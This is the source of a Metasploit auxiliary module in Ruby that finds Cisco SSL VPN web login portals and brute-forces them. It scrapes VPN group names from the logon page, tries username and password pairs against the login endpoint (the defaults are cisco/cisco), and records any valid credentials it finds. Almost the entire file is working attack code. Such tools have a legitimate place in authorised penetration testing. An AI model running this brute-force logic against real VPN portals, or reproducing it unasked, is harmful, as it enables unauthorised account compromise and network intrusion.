##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco SSL VPN Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Cisco SSL VPN web login portals and
        performs login brute force to identify valid credentials.
      },
      'Author'         =>
        [
          'Jonathan Claudius <jclaudius[at]trustwave.com>'
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
          'USERNAME' => 'cisco',
          'PASSWORD' => 'cisco'
        }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('GROUP', [false, "A specific VPN group to use", ''])
      ])
    register_advanced_options(
      [
        OptBool.new('EmptyGroup', [true, "Use an empty group with authentication requests", false])
      ])
  end

  def run_host(ip)
    unless check_conn?
      vprint_error("Connection failed, Aborting...")
      return false
    end

    unless is_app_ssl_vpn?
      vprint_error("Application does not appear to be Cisco SSL VPN. Module will not continue.")
      return false
    end

    vprint_good("Application appears to be Cisco SSL VPN. Module will continue.")

    groups = Set.new
    if datastore['EmptyGroup'] == true
      groups << ""
    elsif datastore['GROUP'].empty?
      vprint_status("Attempt to Enumerate VPN Groups...")
      groups = enumerate_vpn_groups

      if groups.empty?
        vprint_warning("Unable to enumerate groups")
        vprint_warning("Using the default group: DefaultWEBVPNGroup")
        groups << "DefaultWEBVPNGroup"
      else
        vprint_good("Enumerated VPN Groups: #{groups.to_a.join(", ")}")
      end

    else
      groups << datastore['GROUP']
    end

    vprint_status("Starting login brute force...")
    groups.each do |group|
      each_user_pass do |user, pass|
        do_login(user, pass, group)
      end
    end
  end

  # Verify whether the connection is working or not
  def check_conn?
    begin
      res = send_request_cgi('uri' => '/', 'method' => 'GET')
      if res
        vprint_good("Server is responsive...")
        return true
      end
    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
    end
    false
  end

  def enumerate_vpn_groups
    res = send_request_cgi(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET',
          )

    if res &&
       res.code == 302

      res = send_request_cgi(
              'uri' => '/+CSCOE+/logon.html',
              'method' => 'GET',
              'vars_get' => { 'fcadbadd' => "1" }
            )
    end

    groups = Set.new
    group_name_regex = /<select id="group_list"  name="group_list" style="z-index:1(?:; float:left;)?" onchange="updateLogonForm\(this\.value,{(.*)}/

    if res &&
       match = res.body.match(group_name_regex)

      group_string = match[1]
      groups = group_string.scan(/'([\w\-0-9]+)'/).flatten.to_set
    end

    return groups
  end

  # Verify whether we're working with SSL VPN or not
  def is_app_ssl_vpn?
    res = send_request_cgi(
            'uri' => '/+CSCOE+/logon.html',
            'method' => 'GET',
          )

    if res &&
       res.code == 302

      res = send_request_cgi(
              'uri' => '/+CSCOE+/logon.html',
              'method' => 'GET',
              'vars_get' => { 'fcadbadd' => "1" }
            )
    end

    if res &&
       res.code == 200 &&
       res.body.match(/webvpnlogin/)

      return true
    else
      return false
    end
  end

  def do_logout(cookie)
    res = send_request_cgi(
            'uri' => '/+webvpn+/webvpn_logout.html',
            'method' => 'GET',
            'cookie'    => cookie
          )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Cisco SSL VPN',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  # Brute-force the login page
  def do_login(user, pass, group)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect} and group:#{group.inspect}")

    begin
      cookie = "webvpn=; " +
               "webvpnc=; " +
               "webvpn_portal=; " +
               "webvpnSharePoint=; " +
               "webvpnlogin=1; " +
               "webvpnLang=en;"

      post_params = {
        'tgroup'  => '',
        'next'    => '',
        'tgcookieset' => '',
        'username' => user,
        'password' => pass,
        'Login'   => 'Logon'
      }

      post_params['group_list'] = group unless group.empty?

      res = send_request_cgi(
              'uri' => '/+webvpn+/index.html',
              'method' => 'POST',
              'ctype' => 'application/x-www-form-urlencoded',
              'cookie' => cookie,
              'vars_post' => post_params
            )

      if res &&
         res.code == 200 &&
         res.body.match(/SSL VPN Service/) &&
         res.body.match(/webvpn_logout/i)

        print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")

        do_logout(res.get_cookies)

        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
        report_note(ip: rhost, type: 'cisco.cred.group', data: "User: #{user} / Group: #{group}")
        return :next_user

      else
        vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}:#{group.inspect}")
      end

    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
      vprint_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
